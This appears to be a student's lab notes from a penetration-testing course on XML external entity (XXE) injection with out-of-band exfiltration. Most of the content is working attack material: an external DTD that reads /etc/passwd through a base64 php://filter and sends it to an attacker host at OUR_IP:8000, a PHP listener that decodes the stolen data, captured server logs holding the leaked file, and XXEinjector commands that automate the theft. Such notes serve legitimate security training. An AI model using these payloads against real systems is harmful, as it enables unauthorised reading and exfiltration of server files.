## Out-of-band Data Exfiltration

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:

```php
<?php 
if(isset($_GET['content'])){ 
	error_log("\n\n" . base64_decode($_GET['content'])); 
} 
?>
```

```shell
3kjS@htb[/htb]$ vi index.php # here we write the above PHP code 
3kjS@htb[/htb]$ php -S 0.0.0.0:8000 

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE email [ 
	<!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
	%remote; 
	%oob; 
]> 
<root>&content;</root>
```
![](Pasted%20image%2020260724151129.png)

Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:

```shell
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started 
10.10.14.16:46256 Accepted 
10.10.14.16:46256 [200]: (null) /xxe.dtd 
10.10.14.16:46256 Closing 
10.10.14.16:46258 Accepted 

root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
...SNIP...
```
## Automated OOB Exfiltration

```shell
3kjS@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git 

Cloning into 'XXEinjector'... 
...SNIP...
```
![](Screenshot%202026-07-24%20at%2015.13.16.png)

```shell
3kjS@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

```shell
3kjS@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log

root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
...SNIP..
```
